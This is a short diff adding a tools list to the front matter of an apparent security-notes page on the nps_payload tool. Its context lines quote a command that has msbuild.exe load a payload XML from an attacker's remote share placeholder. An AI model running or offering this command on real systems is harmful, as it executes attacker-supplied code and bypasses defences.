@@ -26,6 +26,10 @@ output: "root@kali:~/Documents/nps_payload# python nps_payload.py \n\n          
   Framework\\v4.0.30319\\msbuild.exe \\\\<attackerip>\\<share>\\msbuild_nps.xml"
 created_at: '2019-11-14T23:38:41.527393+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[MSBuild]]'
+- '[[nps payload]]'
+- '[[nps]]'
 ---
 
 # nps payload Execute and Build
